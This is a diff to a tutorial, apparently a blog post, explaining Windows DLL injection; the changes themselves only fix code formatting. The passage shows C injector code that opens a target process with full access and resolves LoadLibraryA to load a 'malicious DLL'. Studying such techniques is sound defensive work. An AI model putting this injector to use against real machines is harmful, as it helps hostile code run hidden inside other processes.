@@ -60,10 +60,10 @@ This concludes the DLL source.
 
 Now comes the injector, which loads the malicious DLL into the target process's memory. The `main()` function looks familiar as such:
 
-```
+```c
 int main() {
-	DWORD pid = find_pid(TARGET);
-	printf("[i] %s: %d\n", TARGET, pid);
+    DWORD pid = find_pid(TARGET);
+    printf("[i] %s: %d\n", TARGET, pid);
     int result = inject_dll_ll(pid);
     printf("[i] Injection Complete!\n");
     return 0;
@@ -74,7 +74,7 @@ We find the Process ID for the target process using `find_pid()` and pass it to 
 
 ```c
 int inject_dll_ll(DWORD pid) {
-	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
+    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
     HANDLE hModule = GetModuleHandle("Kernel32.dll");
     PTHREAD_START_ROUTINE pLoadLibrary = (PTHREAD_START_ROUTINE) GetProcAddress(hModule, "LoadLibraryA");
     CloseHandle(hModule);
